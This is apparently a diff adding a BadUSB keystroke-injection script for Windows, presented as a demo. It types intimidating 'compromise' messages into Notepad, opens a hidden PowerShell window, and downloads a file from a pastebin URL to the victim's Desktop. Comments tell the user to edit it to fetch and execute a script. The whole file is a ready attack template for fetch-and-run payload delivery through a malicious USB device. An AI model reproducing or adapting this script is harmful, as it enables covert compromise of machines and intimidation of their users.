@@ -1,0 +1,105 @@
+REM This is BadUSB demo script for windows, edited by HAHAx1337
+
+REM Open windows notepad
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad
+DELAY 500
+ENTER
+DELAY 750
+
+STRING WARNING! COMPROMISE IN PROGRESS
+ENTER
+DEFAULT_DELAY 50
+
+REM Copy-Paste previous string
+UP
+HOME
+SHIFT DOWN
+CTRL c
+RIGHT
+CTRL v
+DELAY 500
+CTRL v
+DELAY 200
+CTRL v
+DELAY 100
+CTRL v
+DELAY 100
+CTRL v
+DELAY 100
+CTRL v
+
+REM Alt code input demo
+ALTCHAR 7
+ALTSTRING Your firewalls have failed
+DELAY 500
+ENTER
+ALTCHAR 7 
+ALTSTRING Your CISO will be blamed
+ENTER
+STRING disabling security measures 
+ENTER
+DELAY 200
+STRING disabling security measures
+ENTER
+STRING          THIS DEVICE IS BEING SEIZED...
+ENTER
+HOME
+STRING          YOU CANNOT STOP THIS...
+ENTER
+HOME
+STRING        yes...
+DELAY 500
+STRING HAVEyoUBEENP4WNED !!!
+DELAY 200
+GUI r
+DELAY 500
+STRING powershell.exe -windowstyle hidden
+DELAY 500
+ENTER
+REM edit this to download a script file, store as needed extension
+DELAY 750
+STRING Invoke-WebRequest -Uri https://pastebin.com/raw/vWL3Rtw7 -OutFile C:\Users\$env:Username/Desktop/have1beenp4wned.txt
+ENTER
+DELAY 750
+ENTER
+REM edit this to execute rather than open a file
+STRING notepad.exe C:\Users\$env:Username/Desktop/have1beenp4wned.txt
+DELAY 100
+ENTER 
+ENTER
+REM Make capslock flash to know when you can unplug the BadUSB
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
+CAPSLOCK
+DELAY 200
